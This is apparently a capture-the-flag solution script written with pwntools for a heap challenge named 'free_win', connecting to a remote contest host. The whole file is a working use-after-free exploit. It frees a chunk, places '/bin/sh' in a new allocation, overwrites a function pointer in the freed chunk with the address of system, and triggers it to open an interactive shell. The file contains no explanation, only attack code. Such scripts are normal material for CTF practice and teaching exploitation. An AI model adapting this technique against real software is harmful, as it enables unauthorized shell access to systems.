#!/bin/env python3

from pwn import *

context.binary = elf = ELF('challenge/free_win')
context.terminal = ['tmux', 'splitw', '-h']


class Process:
    def __init__(self):
        # self.p = elf.process()
        # self.p = elf.debug(gdbscript='''
        #         b main
        #         c
        # ''')
        self.p = remote('pwn.pwnme.fr', 7011)

    def malloc(self, index, size, content):
        self.p.sendlineafter(b'Execute\n\n', b'1')
        self.p.sendlineafter(b'Index:', str(index).encode())
        self.p.sendlineafter(b'Size:', str(size).encode())
        self.p.sendafter(b'Buffer:', content)

    def free(self, index):
        self.p.sendlineafter(b'Execute\n\n', b'2')
        self.p.sendlineafter(b'Index:', str(index).encode())

    def edit(self, index, content):
        self.p.sendlineafter(b'Execute\n\n', b'3')
        self.p.sendlineafter(b'Index:', str(index).encode())
        self.p.sendafter(b'Buffer:', content)

    def execute(self, index):
        self.p.sendlineafter(b'Execute\n\n', b'4')
        self.p.sendlineafter(b'Index:', str(index).encode())

    def interactive(self):
        self.p.interactive()


p = Process()

p.malloc(0, 0x30, b'A' * 0x2f)

p.free(0)

p.malloc(1, 0x100, b'/bin/sh'.ljust(0xff, b'\x00'))

p.edit(0, flat({
    0x20: elf.symbols['system']+1,
})[:-5] + b'\n')

p.edit(0, flat({
    0x20: elf.symbols['system'],
})[:-9] + b'\n')

p.execute(1)

p.interactive()
